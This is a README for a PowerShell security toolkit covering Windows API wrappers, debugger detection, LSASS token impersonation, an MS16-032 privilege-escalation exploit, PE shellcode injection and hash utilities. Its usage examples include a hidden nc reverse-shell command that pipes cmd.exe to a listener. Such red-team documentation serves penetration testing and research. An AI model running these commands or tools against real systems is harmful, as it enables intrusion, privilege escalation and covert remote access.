# PowerShell-Suite

There are great tools and resources online to accomplish most any task in PowerShell, sometimes however, there is a need to script together a util for a specific purpose or to bridge an ontological gap. This is a collection of PowerShell utilities I put together either for fun or because I had a narrow application in mind.

As such the mileage you get out of them may vary but feel free to post issues or fork & adapt!

## Windows API

Some resources to consult on Windows API access from PowerShell:
* FuzzySecurity: [Low-Level Windows API Access From PowerShell](http://www.fuzzysecurity.com/tutorials/24.html)
* Microsoft TechNet: [Use PowerShell to Interact with the Windows API](https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/)
* Exploit Monday: [Accessing the Windows API in PowerShell via internal .NET methods and reflection](http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html)
* Exploit Monday: [Deep Reflection - Defining Structs and Enums in PowerShell](http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html)

### Invoke-Runas

Functionally equivalent to Windows "runas.exe", using Advapi32::CreateProcessWithLogonW.

```
Start cmd with a local account.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1

Start cmd with remote credentials. Equivalent to "/netonly" in runas.
C:\PS> Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2
```

### Invoke-NetSessionEnum

Use Netapi32::NetSessionEnum to enumerate active sessions on domain joined machines.

```
Enumerate active sessions on "SomeHostName".
C:\PS> Invoke-NetSessionEnum -HostName SomeHostName
```

### Invoke-CreateProcess

Use Kernel32::CreateProcess to achieve fine-grained control over process creation from PowerShell.

```
Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1

Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW
C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1
```

### Detect-Debug

Showcase a number of techniques to detect the presence of Kernel/User-Mode debuggers from PowerShell.

```
Sample below is x64 Win8, WinDbg attached to PowerShell.
C:\PS> Detect-Debug

[+] Detect Kernel-Mode Debugging
    [?] SystemKernelDebuggerInformation: False

[+] Detect User-Mode Debugging
    [?] CloseHandle Exception: Detected
    [?] IsDebuggerPresent: Detected
    [?] CheckRemoteDebuggerPresent: Detected
    [?] PEB!BeingDebugged: Detected
    [?] PEB!NtGlobalFlag: Detected
    [?] DebugSelf: Detected
```

### Get-Handles

Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.

```
Get handles for PID 1234
C:\PS> Get-Handles -ProcID 1234
```

### Get-TokenPrivs

Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.

```
Get token privileges for PID 1234
C:\PS> Get-TokenPrivs -ProcID 1234
```

## pwnd

### Conjure-LSASS

Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it in the calling thread. If SeDebugPrivilege is disabled the function will re-enable it.

```
Conjure LSASS into our midst! ;)
C:\PS> Conjure-LSASS
```

### Invoke-MS16-032

PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo).
    
Targets:

* Win7-Win10 & 2k8-2k12 <== 32/64 bit!
* Tested on x32 Win7, x64 Win8, x64 2k12R2

==> Not tested on Vista with PowerShell v1, let me know what happens if you are able to check this!

```
Sit back and watch the pwn!
C:\PS> Invoke-MS16-032
```

### Subvert-PE

Inject shellcode into a PE image while retaining the PE functionality.

For additional information, please refer to:

* FuzzySecurity: [Powershell PE Injection, this is not the Calc you are looking for!](http://www.fuzzysecurity.com/tutorials/20.html)

```
Analyse the PE header and hexdump the region of memory where shellcode would be injected.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe

Same as above but continue to inject shellcode and overwrite the binary.
C:\PS> Subvert-PE -Path C:\Path\To\PE.exe -Write
```

## Utility

### Calculate-Hash

PowerShell v2 compatible script to calculate file hashes. I quickly scripted this together because Get-FileHash is only available in v4+.

```
Get the SHA512 hash of "C:\Some\File.path".
C:\PS> Calculate-Hash -Path C:\Some\File.path -Algorithm SHA512
```

### Check-VTFile

Submit SHA256 hash of a file to Virus Total and retrieve the scan report if the hash is known. This requires you to get a, free, VirusTotal API key. Again, lot's of better projects out there for this but not PowerShell v2 compatible.

```
C:\PS> Check-VTFile -Path C:\Some\File.path
```